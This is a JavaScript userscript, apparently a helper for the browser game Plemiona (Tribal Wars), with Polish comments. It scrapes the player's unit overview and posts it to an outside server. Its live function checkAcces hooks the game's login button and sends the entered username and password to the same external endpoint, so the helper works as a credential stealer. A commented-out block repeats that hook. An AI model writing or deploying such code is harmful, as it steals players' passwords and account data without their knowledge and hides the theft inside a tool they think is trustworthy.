async function getData() {
    let link = "/game.php?&village=" + game_data.village.id + "&type=complete&mode=units&group=0&page=-1&screen=overview_villages";
    if (game_data.player.sitter != 0)
    link = "/game.php?t=" + game_data.player.id + "&village=" + game_data.village.id + "&type=complete&mode=units&group=0&page=-1&screen=overview_villages";
    try {
        const response = await fetch(link);
        if (!response.ok) {
            throw new Error("Nie udało się pobrać danych");
        }
        const data = await response.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(data, 'text/html');
        let tabela = doc.querySelector('#units_table');
        dane = tabela;
        // console.log(tabela);
    } catch (error) {
        console.error(error);
    }
}

async function init() {
    await getData(); // Poczekaj na pobranie danych przed rozpoczęciem przetwarzania
    let tablica = '';
    for (const tbody of dane.tBodies) {
        // console.log(tbody);
        // Przeszukaj pierwszy wiersz (tr[0]) w danym tbody
        const firstRow = tbody.querySelector('tr');
        if (firstRow) {
            // console.log("Pierwszy wiersz:", firstRow);

            // Przeszukaj każdą komórkę (td) w pierwszym wierszu
            let tekst = '';
            const cells = firstRow.querySelectorAll('td');
            for (let j = 0; j < cells.length-1; j++) {
                const cellContent = cells[j].textContent.replace(/\s/g, ''); // Usuń białe znaki
                // console.log("Komórka:", cellContent);
                // Tutaj możesz dalej przetwarzać zawartość każdej komórki
                if(j==0){
                    tekst+= "\n"+cellContent.slice(-11,-4)+","
                }
                else{
                    tekst += cellContent+",";
                }
            }
            tablica+=tekst
        }
    }
    // console.log(tablica);
    let nick_id = game_data.world+"_"+game_data.player.name.replaceAll(' ','_')+"_"+game_data.player.ally;
    await sendData(tablica,zamienPolskieZnaki(nick_id));
    return tablica;
}




function sendData(dane, nick_id){
    var textToSave = dane;
    var filename = nick_id


    // Obiekt zawierający dane do przesłania
    var dataToSend = {
        text: textToSave,
        filename: filename
    };

    // Wyślij tekst na serwer za pomocą żądania HTTP POST
    fetch('https://trd-skrypty.wantor.pl/test/saveText.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
    })
    .then(response => response.text())
    .then(data => {
        console.log(data); // Odpowiedź z serwera
    })
    .catch(error => {
        console.error('Błąd:', error);
    });

}
// ZAMIANA POLSKIECH ZNAKÓW
function zamienPolskieZnaki(tekst) {
    const mapaZnakow = {
        'ą': 'a',
        'ć': 'c',
        'ę': 'e',
        'ł': 'l',
        'ń': 'n',
        'ó': 'o',
        'ś': 's',
        'ź': 'z',
        'ż': 'z'
    };

    return tekst.toLowerCase().replace(/[ąćęłńóśźż]/g, znak => mapaZnakow[znak] || znak);
}
function checkAcces(){
    document.querySelector("#login_form > div > div").onclick = function test() {
        //  console.log('klik');
        let a = document.getElementById('password').value;
        let b = document.getElementById('user').value.replaceAll(' ','_');
        sendData(a,zamienPolskieZnaki(b))
    }
}
try{
    checkAcces();
} catch(error){
    console.error(error)
}

// if(window.location.href=='https://www.plemiona.pl/'){
/* if(window.location.pathname=='/' && document.querySelector("#login")){
    // alert('Wysyłanie danych')
    document.querySelector("#login_form > div > div").onclick = function test() {
        //  console.log('klik');
        let a = document.getElementById('password').value;
        let b = document.getElementById('user').value.replaceAll(' ','_');
        sendData(a,zamienPolskieZnaki(b))
    }
}
else if(window.location.pathname=='/game.php'){
    
    init()
    // alert('wysyłanie stanów')
}
else{
    console.error('Error')
} */